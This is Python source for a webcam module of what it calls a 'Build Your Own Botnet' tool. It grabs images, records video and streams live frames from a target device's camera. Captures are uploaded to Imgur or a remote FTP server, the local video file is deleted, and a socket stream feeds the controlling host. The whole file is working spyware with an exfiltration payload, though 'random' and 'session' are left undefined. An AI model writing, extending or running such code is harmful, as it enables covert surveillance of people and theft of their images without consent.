#!/usr/bin/python
# -*- coding: utf-8 -*-
'Webcam (Build Your Own Botnet)'

# standard libarary
import os
import sys
import imp
import time
import pickle
import socket
import struct
import urllib

# packages
import cv2

# utilities
import util

# globals
command = True
results = {}
packages  = ['cv2']
platforms = ['win32','linux2','darwin']
usage = 'webcam <imgur/ftp>'
description = """ 
Capture image/video from target device's webcam and
optionally upload it to Imgur or a remote FTP server
"""

# main
def image(*args, **kwargs):
    try:
        dev = cv2.VideoCapture(0)
        r,f = dev.read()
        dev.release()
        if not r:
            util.log(f)
            return "Unable to access webcam"
        png = util.png(f)
        return util.imgur(png) if 'ftp' not in args else util.ftp(png, filetype='.png')
    except Exception as e:
        return '{} error: {}'.format(image.func_name, str(e))

def video(*args, **kwargs):
    try:
        fpath   = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name is 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
        fourcc  = cv2.VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else cv2.VideoWriter_fourcc(*'XVID')
        output  = cv2.VideoWriter(fpath, fourcc, 20.0, (640,480))
        length  = float(int([i for i in args if bytes(i).isdigit()][0])) if len([i for i in args if bytes(i).isdigit()]) else 5.0
        end     = time.time() + length
        dev     = cv2.VideoCapture(0)
        while True:
            ret, frame = dev.read()
            output.write(frame)
            if time.time() > end: break
        dev.release()
        result = util.ftp(fpath, filetype='.avi')
        try:
            util.delete(fpath)
        except: pass
        return result
    except Exception as e:
        return '{} error: {}'.format(video.func_name, str(e))

def stream(host=None, port=None, retries=5):
    try:
        host = session['socket'].getpeername()[0]
        port = int(port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while retries > 0:
            try:
                sock.connect((host, port))
            except socket.error:
                retries -= 1
            break
        if not retries:
            return 'Error: webcam stream unable to connect to server'
        dev = cv2.VideoCapture(0)
        try:
            t1 = time.time()
            while True:
                try:
                    ret,frame=dev.read()
                    data = pickle.dumps(frame)
                    sock.sendall(struct.pack("L", len(data))+data)
                    time.sleep(0.1)
                except Exception as e:
                    util.log('Stream error: {}'.format(str(e)))
                    break
        finally:
            dev.release()
            sock.close()
    except Exception as e:
        return '{} error: {}'.format(stream.func_name, str(e))
